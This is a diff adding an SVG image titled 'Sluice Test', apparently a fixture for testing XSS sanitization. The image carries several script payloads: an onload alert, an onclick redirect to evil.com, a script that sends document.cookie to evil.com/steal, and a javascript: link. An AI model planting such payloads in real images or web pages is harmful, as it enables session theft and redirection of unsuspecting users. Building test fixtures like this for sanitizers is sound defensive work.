@@ -1,0 +1,12 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200" onload="alert('XSS')">
+  <rect width="200" height="200" fill="#2563eb" rx="10"/>
+  <text x="100" y="105" text-anchor="middle" fill="white" font-size="16">Sluice Test</text>
+  <circle cx="100" cy="50" r="20" fill="yellow" onclick="document.location='http://evil.com'"/>
+  <script type="text/javascript">
+    document.cookie = "stolen=" + document.cookie;
+    new Image().src = "http://evil.com/steal?c=" + document.cookie;
+  </script>
+  <a href="javascript:alert('click-jacking')">
+    <text x="100" y="160" text-anchor="middle" fill="white" font-size="12">Click me</text>
+  </a>
+</svg>
